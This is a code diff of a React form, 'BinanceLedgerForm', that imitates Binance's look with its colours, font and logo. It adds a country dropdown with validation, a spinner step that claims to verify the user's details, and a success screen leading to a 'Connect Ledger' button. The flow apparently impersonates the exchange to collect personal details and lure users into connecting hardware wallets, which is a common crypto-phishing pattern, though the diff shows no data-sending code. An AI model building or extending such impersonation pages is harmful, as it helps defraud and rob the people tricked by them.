               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)",
+                border: `1px solid ${errors.country ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                 height: "48px"
               }}
             >
-              <input
-                type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                style={{ 
-                  color: "var(--color-PrimaryText, #EAECEF)",
-                  fontFamily: "BinanceNova, Arial, sans-serif",
-                  fontSize: "14px",
-                  fontWeight: "400",
-                  lineHeight: "20px"
-                }}
+              <select
+                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                 value={personalDetails.country}
                 onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
-              />
+                style={{ backgroundColor: "var(--color-Input, #2B3139)" }}
+              >
+                <option value="" className="bg-[#2B3139] text-white">Select a country</option>
+                {countries.map((country) => (
+                  <option key={country} value={country} className="bg-[#2B3139] text-white">
+                    {country}
+                  </option>
+                ))}
+              </select>
             </div>
+            {errors.country && (
+              <div className="text-red-500 text-sm mt-1 binance-small-text">
+                {errors.country}
+              </div>
+            )}
           </div>
         </div>
 
         <button
-          className="bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-colors flex items-center justify-center"
+          className="binance-button bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "14px",
-            fontWeight: "500",
-            lineHeight: "20px",
             height: "48px"
           }}
           type="submit"
@@ -1093,47 +897,81 @@ const BinanceLedgerForm: FC = () => {
     </>
   );
 
+  const renderVerifyingStep = () => (
+    <>
+      <div className="flex justify-start mb-8">
+        <div className="flex items-center">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
+            alt="Binance Logo" 
+            className="h-8"
+            onError={(e) => {
+              setLogoError(true);
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+          {logoError && (
+            <span className="text-binance-yellow font-bold text-xl">
+              BINANCE
+            </span>
+          )}
+        </div>
+      </div>
+
+      <div className="text-center py-8">
+        <div className="mb-8">
+          <div className="animate-spin rounded-full h-16 w-16 border-4 border-binance-yellow border-t-transparent mx-auto mb-6"></div>
+          <div 
+            className="binance-title mb-4"
+            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+          >
+            Please wait a moment while we verify your details
+          </div>
+        </div>
+      </div>
+    </>
+  );
+
   const renderSuccessStep = () => (
     <>
+      <div className="flex justify-start mb-8">
+        <div className="flex items-center">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
+            alt="Binance Logo" 
+            className="h-8"
+            onError={(e) => {
+              setLogoError(true);
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+          {logoError && (
+            <span className="text-binance-yellow font-bold text-xl">
+              BINANCE
+            </span>
+          )}
+        </div>
+      </div>
+
       <div className="text-center py-8">
         <div 
-          className="mb-6"
-          style={{ 
-            color: "var(--color-PrimaryText, #EAECEF)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "32px",
-            fontWeight: "600",
-            lineHeight: "40px"
-          }}
+          className="mb-8 binance-title"
+          style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
         >
-          Successfully logged in
+          Verification Successful
         </div>
         
-        <div className="mb-8">
-          <svg 
-            width="64" 
-            height="64" 
-            viewBox="0 0 64 64" 
-            className="mx-auto"
-            style={{ color: "var(--color-BtnBg, #FCD535)" }}
-            fill="currentColor"
-          >
-            <circle cx="32" cy="32" r="32" />
-            <path d="M20 32l8 8 16-16" stroke="#202630" strokeWidth="3" fill="none" strokeLinecap="round" strokeLinejoin="round" />
-          </svg>
-        </div>
-        
-        <div 
-          style={{ 
-            color: "var(--color-SecondaryText, #B7BDC6)",
-            fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "16px",
-            fontWeight: "400",
-            lineHeight: "24px"
+        <button
+          className="binance-button bn-button bn-button__primary data-size-large w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold"
+          style={{
+            backgroundColor: "var(--color-BtnBg, #FCD535)",
+            color: "var(--color-TextOnYellow, #202630)",
+            height: "48px"
           }}
+          aria-label="Connect Ledger"
         >
-          You have successfully completed the verification process.
-        </div>
+          Connect Ledger
+        </button>
       </div>
     </>
   );
@@ -1150,6 +988,8 @@ const BinanceLedgerForm: FC = () => {
         return renderImportantNoticeStep();
       case 'personal-details':
         return renderPersonalDetailsStep();
+      case 'verifying':
+        return renderVerifyingStep();
       case 'success':
         return renderSuccessStep();
       default:
